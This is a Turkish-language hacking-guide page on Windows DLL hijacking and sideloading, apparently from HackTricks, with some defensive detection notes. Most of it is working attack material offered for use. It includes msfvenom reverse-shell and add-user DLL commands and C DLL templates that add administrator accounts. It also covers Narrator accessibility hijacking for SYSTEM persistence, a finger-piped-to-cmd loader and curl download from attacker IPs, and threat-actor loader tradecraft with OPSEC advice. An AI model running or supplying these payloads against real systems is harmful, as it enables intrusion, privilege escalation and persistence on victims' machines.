[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), system PATH içindeki herhangi bir klasöre yazma izniniz olup olmadığını kontrol eder.\
Bu zafiyeti keşfetmek için kullanılabilecek diğer ilgi çekici otomatik araçlar **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_'dir.

### Örnek

İstismar edilebilir bir senaryo bulmanız durumunda, bunu başarıyla istismar etmek için en önemli şeylerden biri, **çalıştırılabilir dosyanın DLL'den içe aktaracağı tüm işlevleri dışa aktaran bir dll oluşturmaktır**. Her hâlükârda, DLL Hijacking'in [Medium Integrity seviyesinden High seviyesine **(UAC'yi atlayarak)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [**High Integrity'den SYSTEM'e**](../index.html#from-high-integrity-to-system)** yükselmek** için kullanışlı olduğunu unutmayın. **Geçerli bir dll'nin nasıl oluşturulacağına** dair bir örneği, yürütme için DLL hijacking'e odaklanan bu DLL hijacking incelemesinde bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **bir sonraki bölümde**, **şablon olarak** veya **gerekli olmayan işlevleri dışa aktaran bir dll oluşturmak** için kullanışlı olabilecek bazı **temel dll kodları** bulabilirsiniz.

## **DLL Oluşturma ve Derleme**

### **DLL Proxifying**

Temelde bir **DLL proxy**, **yüklendiğinde kötü amaçlı kodunuzu çalıştırabilen**, aynı zamanda **gerçek kütüphaneye yapılan tüm çağrıları yönlendirerek** kütüphane gibi **davranan** ve **beklendiği şekilde çalışan** bir DLL'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla bir çalıştırılabilir dosya belirtip proxify etmek istediğiniz kütüphaneyi seçebilir, ardından **proxified bir dll oluşturabilir** ya da bir **DLL belirtip** **proxified bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Rev shell al (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Bir meterpreter (x86) edinin:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Bir kullanıcı oluşturun (x86, x64 sürümünü görmedim):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Kendi DLL'iniz

Çoğu durumda derlediğiniz DLL, **kurban süreç tarafından içe aktarılan tüm işlevleri dışa aktarmalıdır**. Gerekli bir dışa aktarma eksikse ikili dosya bu işlevi çözümlenemediğinden exploit başarısız olur.

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Kullanıcı oluşturan C++ DLL örneği</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Thread entry içeren alternatif C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Örnek Olay: Narrator OneCore TTS Yerelleştirme DLL Hijack (Erişilebilirlik/ATs)

Windows Narrator.exe, başlangıçta tahmin edilebilir, dile özgü bir yerelleştirme DLL'sini hâlâ arar. Bu DLL, arbitrary code execution ve persistence için hijack edilebilir.<sup>[[7]](#references)</sup>

Temel bilgiler
- Arama yolu (güncel sürümler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Eski yol (önceki sürümler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore yolunda saldırganın denetimindeki yazılabilir bir DLL varsa yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalıştırılır. Herhangi bir export gerekmez.

Procmon ile tespit
- Filtre: `Process Name is Narrator.exe` ve `Operation is Load Image` veya `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki yol için yükleme girişimini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC sessizliği
- Naive bir hijack, UI'da görünürlük oluşturur veya vurgulama yapar. Sessiz kalmak için attach sırasında Narrator thread'lerini listeleyin, ana thread'i (`OpenThread(THREAD_SUSPEND_RESUME)`) açın ve `SuspendThread` ile askıya alın; işleminize kendi thread'inizde devam edin. Tam kod için PoC'ye bakın.<sup>[[8]](#references)</sup>

Accessibility yapılandırması üzerinden tetikleme ve kalıcılık
- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle, Narrator başlatıldığında ekilen DLL yüklenir. Güvenli masaüstünde (oturum açma ekranında), Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.

RDP ile tetiklenen SYSTEM çalıştırması (yatay hareket)
- Klasik RDP güvenlik katmanını etkinleştirin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Ana bilgisayara RDP ile bağlanın; oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
- RDP oturumu kapandığında çalıştırma durur; hemen inject/migrate edin.

Kendi Accessibility aracınızı getirin (BYOA)
- Yerleşik bir Accessibility Tool (AT) kayıt defteri girdisini (ör. CursorIndicator) klonlayabilir, rastgele bir binary/DLL'e işaret edecek şekilde düzenleyip içe aktarabilir ve ardından `configuration` değerini bu AT adını kullanacak şekilde ayarlayabilirsiniz. Bu, Accessibility framework'ü altında rastgele kod çalıştırmaya aracılık eder.

Notlar
- `%windir%\System32` dizinine yazmak ve HKLM değerlerini değiştirmek yönetici hakları gerektirir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde bulunabilir; export gerekmez.

## Vaka Çalışması: CVE-2025-1729 - TPQMAssistant.exe Kullanarak Privilege Escalation

Bu vaka, Lenovo TrackPoint Quick Menu'deki (`TPQMAssistant.exe`) **Phantom DLL Hijacking** tekniğini gösterir; bu açık **CVE-2025-1729** olarak izlenmektedir.<sup>[[2]](#references)[[3]](#references)</sup>

### Güvenlik Açığı Ayrıntıları

- **Bileşen**: `C:\ProgramData\Lenovo\TPQM\Assistant\` konumundaki `TPQMAssistant.exe`.
- **Zamanlanmış Görev**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, her gün 9:30'da oturum açmış kullanıcının bağlamında çalışır.
- **Dizin İzinleri**: `CREATOR OWNER` tarafından yazılabilir; bu da yerel kullanıcıların rastgele dosyalar bırakmasına olanak tanır.
- **DLL Arama Davranışı**: `hostfxr.dll` dosyasını önce çalışma dizininden yüklemeye çalışır ve dosya yoksa "NAME NOT FOUND" kaydını oluşturur; bu, yerel dizinin arama önceliğine sahip olduğunu gösterir.

### Exploit Uygulaması

Bir saldırgan, aynı dizine kötü amaçlı bir `hostfxr.dll` stub'ı yerleştirerek eksik DLL'den yararlanabilir ve kullanıcının bağlamında kod çalıştırabilir:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Saldırı Akışı

1. Standart kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin mevcut kullanıcının bağlamında 9:30 AM'de çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturum açmışsa kötü amaçlı DLL, yöneticinin oturumunda orta bütünlük düzeyinde çalışır.
4. Orta bütünlük düzeyinden SYSTEM ayrıcalıklarına yükselmek için standart UAC bypass tekniklerini zincirleyin.

## Vaka İncelemesi: MSI CustomAction Dropper + İmzalı Host Üzerinden DLL Side-Loading (wsc_proxy.exe)

Tehdit aktörleri, payload'ları güvenilir ve imzalı bir process altında çalıştırmak için sıklıkla MSI tabanlı dropper'ları DLL side-loading ile birlikte kullanır.<sup>[[10]](#references)</sup>

Zincire genel bakış
- Kullanıcı MSI dosyasını indirir. GUI kurulumu sırasında bir CustomAction sessizce çalışır (ör. LaunchApplication veya bir VBScript action) ve sonraki aşamayı gömülü kaynaklardan yeniden oluşturur.
- Dropper, meşru ve imzalı bir EXE'yi ve kötü amaçlı bir DLL'yi aynı dizine yazar (örnek çift: Avast imzalı wsc_proxy.exe + saldırganın kontrolündeki wsc.dll).
- İmzalı EXE başlatıldığında Windows DLL arama sırası, wsc.dll dosyasını önce çalışma dizininden yükler ve saldırganın kodunu imzalı bir üst process altında çalıştırır (ATT&CK T1574.001).

MSI analizi (nelere bakılmalı)
- CustomAction tablosu:
  - Çalıştırılabilir dosyaları veya VBScript'i çalıştıran girdileri arayın. Şüpheli bir örüntü: arka planda gömülü bir dosyayı çalıştıran LaunchApplication.
  - Orca'da (Microsoft Orca.exe) CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki gömülü/bölünmüş payload'lar:
  - Yönetim amaçlı çıkarma: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Veya lessmsi kullanın: lessmsi x package.msi C:\out
  - Bir VBScript CustomAction tarafından birleştirilip şifresi çözülen birden çok küçük parçayı arayın. Yaygın akış:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre bırakın:
  - wsc_proxy.exe: Meşru, imzalı host (Avast). İşlem, wsc.dll dosyasını kendi dizininden adına göre yüklemeye çalışır.
  - wsc.dll: Saldırgan DLL'i. Belirli export'lar gerekmiyorsa DllMain yeterli olabilir; aksi takdirde, proxy DLL oluşturup payload'ı DllMain içinde çalıştırırken gerekli export'ları gerçek kütüphaneye yönlendirin.
- Minimal bir DLL payload'ı oluşturun:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export gereksinimleri için, payload’unuzu da çalıştıran bir forwarding DLL oluşturmak üzere bir proxying framework (ör. DLLirant/Spartacus) kullanın.

- Bu teknik, host binary’nin DLL ad çözümlemesine dayanır. Host absolute path’ler veya güvenli yükleme bayrakları (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded export’lar öncelik sırasını etkileyebilir; host binary’yi ve export setini seçerken bunları göz önünde bulundurun.

## İmzalı üçlüler + şifrelenmiş payload’lar (ShadowPad örnek olayı)

Check Point, Ink Dragon’ın ShadowPad’i, meşru yazılımlara benzerken ana payload’u diskte şifrelenmiş halde tutan **üç dosyalı bir üçlü** kullanarak dağıttığını açıkladı:<sup>[[12]](#references)</sup>

1. **İmzalı host EXE** – AMD, Realtek veya NVIDIA gibi üreticiler kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar executable’ı Windows binary’si gibi görünecek şekilde yeniden adlandırır (örneğin `conhost.exe`), ancak Authenticode imzası geçerliliğini korur.
2. **Kötü amaçlı loader DLL** – EXE’nin yanına beklenen adla bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework’üyle obfuscate edilmiş bir MFC binary’sidir; tek görevi şifrelenmiş blob’u bulmak, şifresini çözmek ve ShadowPad’i reflectively map etmektir.
3. **Şifrelenmiş payload blob’u** – genellikle aynı dizinde `<name>.tmp` olarak saklanır. Şifresi çözülmüş payload’u belleğe map ettikten sonra loader, adli inceleme kanıtlarını yok etmek için TMP dosyasını siler.

Tradecraft notları:

* İmzalı EXE’yi yeniden adlandırmak (PE header’daki özgün `OriginalFileName` değerini korurken), üretici imzasını muhafaza ederek Windows binary’si gibi görünmesini sağlar. Bu nedenle, Ink Dragon’ın gerçekten AMD/NVIDIA yardımcı programları olan `conhost.exe` görünümlü binary’ler bırakma alışkanlığını taklit edin.
* Executable güvenilir kalacağından, allowlisting kontrollerinin çoğunda yalnızca kötü amaçlı DLL’nizin onun yanına yerleştirilmesi yeterlidir. Loader DLL’yi özelleştirmeye odaklanın; imzalı üst öğe genellikle değiştirilmeden çalışabilir.
* ShadowPad’in decryptor’ı, TMP blob’un loader’ın yanında bulunmasını ve belleğe map edildikten sonra dosyayı sıfırlayabilmek için yazılabilir olmasını bekler. Payload yüklenene kadar dizini yazılabilir tutun; belleğe alındıktan sonra OPSEC için TMP dosyası güvenle silinebilir.

### LOLBAS stager + aşamalı arşiv sideloading zinciri (finger → tar/curl → WMI)

Operatörler, diskteki tek özel artifact’ın güvenilir EXE’nin yanındaki kötü amaçlı DLL olmasını sağlamak için DLL sideloading’i LOLBAS ile eşleştirir:<sup>[[1]](#references)</sup>

- **Uzaktan komut loader’ı (Finger):** Gizli PowerShell `cmd.exe /c` başlatır, Finger sunucusundan komutları alır ve bunları `cmd`’ye pipe eder:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host`, TCP/79 üzerinden metin çeker; `| cmd` sunucu yanıtını çalıştırır ve operatörlerin ikinci aşama sunucusunu sunucu tarafında değiştirmesine olanak tanır.

- **Yerleşik indirme/çıkarma:** Zararsız bir uzantıya sahip arşivi indirin, açın ve sideload hedefini DLL ile birlikte rastgele bir `%LocalAppData%` klasörüne yerleştirin:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ilerleme bilgisini gizler ve yönlendirmeleri izler; `tar -xf`, Windows'un yerleşik tar aracını kullanır.

- **WMI/CIM ile başlatma:** Telemetride CIM tarafından oluşturulmuş bir süreç görünürken yanındaki DLL'i yüklemesi için EXE'yi WMI üzerinden başlatın:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Yerel DLL’leri tercih eden binary’lerle çalışır (örn. `intelbq.exe`, `nearby_share.exe`); payload (örn. Remcos), güvenilir ad altında çalışır.

- **Tespit:** `/p`, `/m` ve `/c` seçenekleri birlikte kullanıldığında `forfiles` için uyarı oluşturun; bu kullanım yönetici betikleri dışında yaygın değildir.


## Vaka Çalışması: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom saldırısı, DLL sideload ve tamamen bellek içi payload’lar hazırlayan, NSIS ile paketlenmiş bir dropper teslim etmek için güvenilir bir güncelleme zincirini kötüye kullandı.<sup>[[13]](#references)</sup>

Tradecraft akışı
- `update.exe` (NSIS), `%AppData%\Bluetooth` dizinini oluşturur, **HIDDEN** olarak işaretler, yeniden adlandırılmış bir Bitdefender Submission Wizard `BluetoothService.exe`, kötü amaçlı bir `log.dll` ve şifrelenmiş bir `BluetoothService` dosyası bırakır, ardından EXE’yi başlatır.
- Ana makine EXE’si `log.dll` dosyasını import eder ve `LogInit`/`LogWrite` işlevlerini çağırır. `LogInit` blob’u mmap ile yükler; `LogWrite` blob’u özel bir LCG tabanlı akışla çözer (sabitler **0x19660D** / **0x3C6EF35F**, anahtar materyali önceki bir hash’ten türetilir), tamponun üzerine düz metin shellcode’u yazar, geçici verileri serbest bırakır ve shellcode’a atlar.
- IAT kullanmamak için loader, export adlarını **FNV-1a başlangıç değeri 0x811C9DC5 + 0x1000193 asal sayısı** ile hash’ler, ardından Murmur tarzı bir avalanche (**0x85EBCA6B**) uygular ve sonuçları salt eklenmiş hedef hash’lerle karşılaştırır.

Ana shellcode (Chrysalis)
- Ana PE benzeri modülü, beş geçiş boyunca `gQ2JR&9;` anahtarıyla tekrarlanan toplama/XOR/çıkarma işlemleri uygulayarak çözer, ardından import çözümlemesini tamamlamak için `Kernel32.dll` → `GetProcAddress` işlevlerini dinamik olarak yükler.
- DLL adlarını çalışma zamanında, karakter başına bit döndürme/XOR dönüşümleriyle yeniden oluşturur, ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` yükler.
- **PEB → InMemoryOrderModuleList** zincirini dolaşan, her export tablosunu Murmur tarzı karıştırma kullanarak 4 baytlık bloklar hâlinde ayrıştıran ikinci bir resolver kullanır; yalnızca hash bulunamazsa `GetProcAddress` işlevine geri döner.

Gömülü yapılandırma ve C2
- Yapılandırma, bırakılan `BluetoothService` dosyasının **0x30808** konumunda (**0x980** boyutunda) bulunur ve C2 URL’sini ve User-Agent’ı açığa çıkarmak için `qwhvb^435h&*7` anahtarıyla RC4 kullanılarak çözülür.
- Beacon’lar noktayla ayrılmış bir host profili oluşturur, başına `4Q` etiketini ekler, ardından HTTPS üzerinden `HttpSendRequestA` çağrısından önce `vAuig34%^325hGV` anahtarıyla RC4 kullanarak şifreler. Yanıtların şifresi RC4 ile çözülür ve bir tag switch ile yönlendirilir (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + parçalı aktarım durumları).
- Çalıştırma modu CLI argümanlarına bağlıdır: argüman yoksa `-i` parametresini kullanan persistence (service/Run key) yüklenir; `-i` kendini `-k` ile yeniden başlatır; `-k` kurulumu atlar ve payload’ı çalıştırır.

Gözlemlenen alternatif loader
- Aynı saldırı Tiny C Compiler’ı bıraktı ve `C:\ProgramData\USOShared\` dizininden, yanındaki `libtcc.dll` ile birlikte `svchost.exe -nostdlib -run conf.c` komutunu çalıştırdı. Saldırganın sağladığı C kaynak kodu shellcode’u içeriyordu; derlenip, PE diske yazılmadan bellek içinde çalıştırıldı. Şöyle tekrarlanabilir:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Bu TCC tabanlı derleme ve çalıştırma aşaması, `Wininet.dll` dosyasını çalışma zamanında içe aktarıp sabit kodlanmış bir URL'den ikinci aşama shellcode'unu aldı ve böylece kendisini bir derleyici çalıştırması gibi gösteren esnek bir loader sağladı.

## Signed-host sideloading with export proxying + host thread parking

Bazı DLL sideloading zincirleri, kötü amaçlı DLL yüklendikten sonra çökmesini önlemek ve sonraki aşamaların sorunsuz yüklenmesine yetecek kadar uzun süre çalışır durumda kalmasını sağlamak için **kararlılık mühendisliği** ekler.<sup>[[11]](#references)</sup>

Gözlemlenen örüntü
- Güvenilir bir EXE'yi, `version.dll` gibi beklenen bağımlılık adıyla kötü amaçlı bir DLL'nin yanına bırakın.
- Kötü amaçlı DLL, içe aktarma çözümlemesinin başarılı olması ve ana bilgisayar sürecinin çalışmaya devam etmesi için beklenen tüm export'ları gerçek sistem DLL'sine (örneğin `%SystemRoot%\\System32\\version.dll`) **proxy'ler**.
- Yüklendikten sonra kötü amaçlı DLL, ana iş parçacığının çıkmak veya süreci sonlandıracak kod yollarını çalıştırmak yerine sonsuz bir `Sleep` döngüsüne girmesi için ana bilgisayarın giriş noktasına **yama uygular**.
- Yeni bir iş parçacığı gerçek kötü amaçlı işi yapar: sonraki aşama DLL'sinin adını veya yolunu çözer (RC4/XOR yaygın yöntemlerdir) ve ardından `LoadLibrary` ile yükler.

Bunun önemi
- Normal DLL proxy'leme, API uyumluluğunu korur ancak ana bilgisayarın sonraki aşamalar için yeterince uzun süre çalışır durumda kalacağını garanti etmez.
- Ana iş parçacığını `Sleep(INFINITE)` içinde bekletmek, loader bir çalışan iş parçacığında şifre çözme, hazırlık veya ağ başlangıç işlemlerini yaparken imzalı sürecin bellekte kalmasını sağlamanın basit bir yoludur.
- Yalnızca şüpheli bir `DllMain` için arama yapmak, ilginç davranış ana bilgisayarın giriş noktasına yama uygulandıktan ve ikincil bir iş parçacığı başladıktan sonra gerçekleşiyorsa bu örüntüyü gözden kaçırabilir.

Temel iş akışı
1. İmzalı ana bilgisayar EXE'sini kopyalayın ve yerel dizinden hangi DLL'yi yüklediğini belirleyin.
2. Aynı işlevleri dışa aktaran ve bunları meşru DLL'ye yönlendiren bir proxy DLL oluşturun.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir çalışan iş parçacığı oluşturun.
4. Bu iş parçacığından, döngüde `Sleep` çağrısı yapması için ana bilgisayarın giriş noktasına veya ana iş parçacığının başlangıç yordamına yama uygulayın.
5. Sonraki aşama DLL'sinin adını/yapılandırmasını çözün ve `LoadLibrary` çağırın ya da payload'u manuel olarak belleğe eşleyin.

Savunma açısından incelenecek noktalar
- `version.dll` veya benzer yaygın kitaplıkları `System32` yerine kendi uygulama dizinlerinden yükleyen imzalı süreçler.
- Görüntü yüklendikten kısa süre sonra süreç giriş noktasına uygulanan bellek yamaları; özellikle `Sleep`/`SleepEx` çağrılarına yönlendirilen atlamalar/çağrılar.
- Bir proxy DLL tarafından oluşturulan ve şifresi çözülmüş bir adla ikinci bir DLL üzerinde hemen `LoadLibrary` çağıran iş parçacıkları.
- `ProgramData`, `%TEMP%` veya açılmış arşiv yolları gibi yazılabilir hazırlık dizinlerinde, üreticiye ait yürütülebilir dosyaların yanına yerleştirilmiş tüm export'ları proxy'leyen DLL'ler.

## References

- [1] [Red Canary – İstihbarat İçgörüleri: Ocak 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe kullanılarak ayrıcalık yükseltme](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows'ta DLL hijacking. Basit bir C örneği.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore, Avrupa'yı hedef alan yeni malware'ı dağıtıyor](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack'leri Windows yardımcılarıyla buluştuğunda](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Dijital Doppelgänger'lar: Gh0st RAT dağıtan gelişen kimliğe bürünme kampanyalarının anatomisi](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Kesişen çıkarlar: Güneydoğu Asya'daki bir hükümeti hedef alan tehdit kümelerinin analizi](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon'un iç yüzü: Gizli bir saldırı operasyonunun relay ağını ve işleyişini ortaya çıkarma](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom araç setine derinlemesine bakış](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack zinciri](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – İranlı APT Screening Serpens'in 2026 casusluk kampanyalarını izleme](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Hızlı ve öfkeli: İran çatışması sırasında Nimbus Manticore operasyonları](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Görev eylemleri](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062, Güneydoğu Asya hükümetlerini ve kritik altyapıyı hedef alıyor](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – PE biçimi](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – Meşru yazılıma gömülü bir SectopRAT varyantını ortaya çıkarma](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
